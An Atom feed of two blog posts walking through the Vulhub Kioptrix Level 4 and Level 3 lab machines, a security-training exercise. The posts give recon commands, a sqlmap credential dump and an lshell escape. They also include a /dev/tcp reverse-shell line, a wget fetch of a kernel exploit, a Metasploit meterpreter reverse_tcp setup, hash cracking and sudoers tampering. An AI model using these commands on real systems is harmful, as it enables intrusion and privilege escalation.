<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: kioptrix | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/kioptrix/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-07-06T16:07:22-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Vulhub Kioptrix Level 4]]></title>
    <link href="http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4/"/>
    <updated>2016-06-15T16:10:59-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>wfuzz</li>
<li>nikto</li>
<li>zap</li>
<li>Burpsuite</li>
<li>Sqlmap</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.190 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.190 -p-</code></p>

<pre><code># nmap -sV -v -O -A -T5 192.168.79.190 -p-

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-15 16:14 CDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
Initiating ARP Ping Scan at 16:14
Scanning 192.168.79.190 [1 port]
Completed ARP Ping Scan at 16:14, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:14
Completed Parallel DNS resolution of 1 host. at 16:14, 1.99s elapsed
Initiating SYN Stealth Scan at 16:14
Scanning 192.168.79.190 [65535 ports]
Discovered open port 445/tcp on 192.168.79.190
Discovered open port 139/tcp on 192.168.79.190
Discovered open port 80/tcp on 192.168.79.190
Discovered open port 22/tcp on 192.168.79.190
Completed SYN Stealth Scan at 16:14, 11.91s elapsed (65535 total ports)
Initiating Service scan at 16:14
Scanning 4 services on 192.168.79.190
Completed Service scan at 16:14, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.79.190
NSE: Script scanning 192.168.79.190.
Initiating NSE at 16:14
Completed NSE at 16:15, 15.56s elapsed
Initiating NSE at 16:15
Completed NSE at 16:15, 0.01s elapsed
Nmap scan report for 192.168.79.190
Host is up (0.00033s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:EA:4D:22 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.001 days (since Wed Jun 15 16:13:14 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=203 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   KIOPTRIX4&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   KIOPTRIX4&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   KIOPTRIX4&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2016-06-15T17:15:00-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 192.168.79.190

NSE: Script Post-scanning.
Initiating NSE at 16:15
Completed NSE at 16:15, 0.00s elapsed
Initiating NSE at 16:15
Completed NSE at 16:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
           Raw packets sent: 91558 (4.029MB) | Rcvd: 39548 (1.583MB)
</code></pre>

<p>Services ssh, http and smb are running.</p>

<h3>check HTTP service:</h3>

<p>use wfuzz to scan:</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.190/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<h3>check SMB service:</h3>

<p>use enum4linux to enumerate SMB:</p>

<p><code>enum4linux -a 192.168.79.190</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I searched exploitdb and metasploit and tried serveral exploits to SMB, failed.</p>

<p>Now I turn to http service.</p>

<p>use zap to scan:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like there is a SQL injection in parameter mypassword.</p>

<p>use Burp to check:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>save the POST request to a file called test.txt</p>

<p>run sqlmap to dump the credential:</p>

<p><code>sqlmap -r test.txt -p mypassword --dump</code></p>

<p>get:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>now try to login to web and see if I can upload webshell:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Nothing excited.</p>

<p>Okay, try to login via SSH:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>It is an limited shell:</p>

<p>&lsquo;ls -ahlR /root/&rsquo;</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>After google it, I found it may be lshell</p>

<p><a href="https://github.com/ghantoos/lshell">lshell</a></p>

<p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p>

<p>looks like it support command echo, try to get bash:</p>

<p><code>echo os.system("/bin/bash")</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Got the shell now!</p>

<p>start to get root&hellip;</p>

<p>Enumeration stage,</p>

<p><code>uname -a</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit linux kernel 2.6 | grep local</code> and I pick sendpage one</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>download the exploit to /var/www/html/:</p>

<p><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9641.tar.gz</code></p>

<p>start web server:</p>

<p><code>service apache2 start</code></p>

<p>in kioptrix4</p>

<p><code>wget http://192.168.79.173/9641.tar.gz</code></p>

<p>hang there, maybe iptable block the traffic to port 80</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>I tried <code>/bin/bash -i &gt; /dev/tcp/192.168.79.173/1234 0&lt;&amp;1</code> also doesn&rsquo;t work</p>

<p>finally I used python SimpleHTTPServer:</p>

<p><code>service apache2 stop</code>
<code>python -m SimpleHTTPServer</code></p>

<p>in kioptrix4</p>

<p><code>wget 192.168.79.173:8000/9641.tar.gz</code></p>

<p>unzip it:</p>

<p><code>tar zxvf 9641.tar.gz</code></p>

<p>try to compile it, cannot find gcc. WTF</p>

<p>search it</p>

<p><code>whereis gcc</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>this is a folder, and it is i486-linux-gnu, check kioptrix4&rsquo;s architecture.</p>

<p><code>uname -m</code>
It is i686. Oh different&hellip;.</p>

<p>Luckly, my kali is i686, I just compile on my kali and upload to kioptrix4</p>

<p>run it</p>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub-Kioptrix Level 3]]></title>
    <link href="http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3/"/>
    <updated>2016-06-09T11:42:38-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Metasploit</li>
<li>Wfuzz</li>
<li>Hashcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.184 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Ports 22 and 80 are opening.</p>

<p>Now use Nikto to scan:</p>

<p><code>nikto -h 192.168.79.184</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Nothing excited.</p>

<p>Now lets browser the web page in the target.</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Find the target may use LotusCMS.</p>

<p>In msfconsole:</p>

<p><code>search LotusCMS</code></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find one exploit</p>

<pre><code>msf &gt; use exploit/multi/http/lcms_php_exec 
msf exploit(lcms_php_exec) &gt; set rhost 192.168.79.184
msf exploit(lcms_php_exec) &gt; set uri 
msf exploit(lcms_php_exec) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(lcms_php_exec) &gt; set lhost 192.168.79.173
exploit
</code></pre>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Got the shell, next step is try to get root.</p>

<p>In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>maybe the  username/password for ssh, but no. Thats too easy.</p>

<p>So that I go back to use wfuzz the scan the http services.</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it has phpmyadmin. Try that:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>Log in using the username/password that just found. Successed.</p>

<p>review the content, found this:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>now found two users and the hashed passwords:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Copy the passwords to a file use hashcat to crack it:</p>

<p><code>hashcat hash.txt /user/share/wordlists/rockyou.txt</code></p>

<p>get both passwords:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>ssh to the target, search the SUID binaries:</p>

<p><code>find / -perm +6000 -type f -exec ls -ld {} \;</code></p>

<p>found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.</p>

<p>now try to use it to open /etc/sudoers file, get error message. to fix it:</p>

<p><code>export TERM=xterm</code></p>

<p>change the loneferret permission:</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>get the root</p>

<p><img src="/images/blog/vulhub/kioptrix3/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
</feed>
